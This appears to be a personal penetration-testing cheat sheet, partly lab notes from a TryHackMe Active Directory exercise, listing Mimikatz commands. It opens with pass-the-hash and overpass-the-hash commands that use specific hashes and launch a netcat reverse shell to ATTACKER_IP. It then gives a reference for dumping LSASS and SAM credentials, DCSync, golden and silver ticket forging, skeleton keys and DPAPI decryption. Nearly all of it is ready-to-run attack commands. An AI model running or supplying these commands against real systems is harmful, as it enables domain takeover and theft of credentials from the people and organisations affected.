#active  #windows
pass the hash

```
privilege::debug
token::elevate
sekurlsa::msv
```

```shell-session
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

over paas the hash

```
privilege::debug
token::elevate
sekurlsa::ekeys
```


```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```


```
privilege::debug
token::elevate
sekurlsa::logonpasswords
```
`To get all the creds from current logins`


### **Starting Mimikatz**

#### Interactive Mode

mimikatz.exe

#### **Single Command Execution**

mimikatz.exe "command"

#### Enable Debug Privileges

privilege::debug

### Core Commands

#### General Commands

help #List all available commands

exit #Quit Mimikatz

log file.txt #Log all output to a file

version #Display Mimikatz version

#### Privilege Escalation

privilege::debug #Enable debug privileges

token::whoami #Check the current token privileges

token::elevate #Attempt to elevate the token privileges

token::revert #Revert to original token

### Password and Hash Dumping

#### Local Credential Dumping

sekurlsa::logonpasswords #Dump credentials of logged-in users

sekurlsa::credman #Retrieve saved credentials in Credential Manager

#### Extract NTLM Hashes

lsadump::sam #Dump hashes from the SAM database

lsadump::lsa /inject #Extract secrets from LSA

lsadump::secrets #Extract stored secrets (e.g., service account passwords)

#### Domain Controller Hash Extraction (DCSync)

lsadump::dcsync /domain:example.com /user:Administrator #Sync NTLM hash for a specific user

lsadump::dcsync /all /domain:example.com #Sync all domain NTLM hashes

lsadump::dcsync /domain:example.com /user:krbtgt #Extract the Kerberos TGT hash

### Kerberos Operations

#### List and Export Tickets

kerberos::list #List all Kerberos tickets

kerberos::list /export #Export tickets to .kirbi files

#### Pass-the-Ticket

kerberos::ptt ticket.kirbi #Inject a Kerberos ticket

#### Golden Ticket Creation

kerberos::golden /domain:example.com /sid:S-1-5-21... /krbtgt:<hash> /user:Administrator

#### Silver Ticket Creation

kerberos::golden /domain:example.com /sid:S-1-5-21... /target:SERVER /rc4:<hash> /user:User

#### Kerberos Delegation Tickets

kerberos::golden /domain:example.com /sid:S-1-5-21... /user:Administrator /rc4:<hash> /service:krbtgt

### Pass-the-Hash

#### Perform Pass-the-Hash Attack

sekurlsa::pth /user:Administrator /domain:example.com /ntlm:<hash> /run:cmd.exe

#### Combine with PowerShell

sekurlsa::pth /user:Administrator /domain:example.com /ntlm:<hash> /run:powershell.exe

### Dumping LSASS Memory

#### Live Dump

sekurlsa::logonpasswords #Extract credentials directly from memory

#### Offline Analysis

procdump.exe -ma lsass.exe lsass.dmp

mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"

### Generating Skeleton Keys

misc::skeleton #Inject a universal key to authenticate any domain account

### Credential Extraction via DPAPI

#### Extract Master Keys

dpapi::masterkey /in:<file>

#### Decrypt Credentials

dpapi::cred /in:<credential_file>

dpapi::wifi /in:<wireless_profile.xml>

### Exporting and Logging

#### Export Logs

log log.txt #Save output to a file

#### Export Kerberos Tickets

kerberos::list /export #Save tickets to .kirbi files

### Advanced Examples and Use Cases

#### Extracting Service Account Passwords

lsadump::secrets /inject

#### Bypassing RunAs Restrictions

token::elevate

misc::cmd

#### Stealing Cached Credentials

sekurlsa::logonpasswords